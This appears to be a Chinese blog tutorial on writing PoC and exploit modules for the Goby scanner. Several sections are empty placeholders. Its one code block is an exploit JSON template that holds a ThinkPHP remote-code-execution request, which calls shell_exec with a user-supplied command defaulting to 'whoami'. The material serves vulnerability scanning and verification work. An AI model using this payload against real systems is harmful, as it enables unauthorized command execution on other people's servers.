---
layout: post
title: goby 扫描工具 poc 编写
categories: [安全]
description: goby 扫描器使用方式
keywords:  安全工具
---

# goby 

Goby 是通过 golang 编写的扫描器，同时拥有资产扫描、资产识别和漏洞扫描能力，安装简单，直接解压即可使用，界面也非常友好，内置了大量由官方和其他网络安全从业者提供的poc。

下载链接:

https://github.com/gobysec/Goby/releases



## 前言

前段时间的Log4j漏洞影响很广泛，网上已经公开了很多地方的利用方式，而平时用goby较多，就想利用goby的指纹识别对目标定向检测。这篇文章就从Apache Solr Log4j漏洞为例，教大家如何写goby poc，文章中有错误还请及时指正。

Goby可以通过编写go文件，来实现一些高级的漏洞检测或利用，例如dnslog检测漏洞，详情可查阅goby官方文档：https://cn.gobies.org/docs/exp/index.html

## 准备知识

[ 添加 goby poc 教程](https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#goby-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%BC%95%E6%93%8E%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D)

## 二、漏洞復現





## 三、goby poc 编写

Goby 是通过 golang 编写的，而一些漏洞检测场景（比如dnslog验证），goby自身的JSON 格式无法满足这一需求，需采用 Golang 编写漏洞代码。



### expJson部分

### poc编写

[参考](https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#poc-%E7%BC%96%E5%86%99)

### EXP 编写

  goby还有Verify功能，我们需要增加exp部分才可以在扫描到漏洞之后直接用goby验证，但是这部分没法在gui编写。首先，找到刚才编写的POC自动生成的JSON文件。


> 路径：\goby-win-x64-1.8.202\golib\exploits\user


exp 例子：
```
"HasExp": true				// 是否录入 Exp，如有 Exp，Goby 在扫描到漏洞后会展现出 verify 按钮用以执行 Exp 验证漏洞
"ExpParams": [				// 前端需要传递给 Exp 的参数，如要执行的命令
    {
        "name": "cmd",		// 参数的名称
        "type": "input",	// 参数输入类型，input 表示需要用户输入，select 表示 Exp 可以提供默认列表让用户进行选择输入内容
        "value": "whoami"	// 参数的值
    }
]
"ExploitSteps": [
    "AND",
    {
        "Request": {
            "method": "GET",
            "uri": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={{{cmd}}}",					// 通过 {{{参数名称}}} 引用前端传递过来的值
            "follow_redirect": true,
            "header": {},
            "data_type": "text",
            "data": ""
        },
        "SetVariable": ["output|lastbody"]		// 将响应的 HTTP Body 打印出来，展示命令执行效果
    }
]
```






## Goby+AWVS看黑客如何躺着挖洞

[参考](https://zhuanlan.zhihu.com/p/414104243)
